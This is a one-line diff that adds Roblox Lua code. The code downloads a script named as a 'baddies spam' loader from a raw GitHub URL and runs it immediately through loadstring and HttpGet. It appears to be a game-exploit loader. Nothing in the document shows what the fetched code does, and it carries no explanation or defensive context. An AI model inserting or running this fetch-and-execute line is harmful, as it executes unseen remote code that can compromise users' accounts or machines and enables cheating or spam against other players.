@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Frontierpifurnace41/loaders/main/loaders/upd-baddies-spam1-0p68mz9pof9hr2.lua"))()
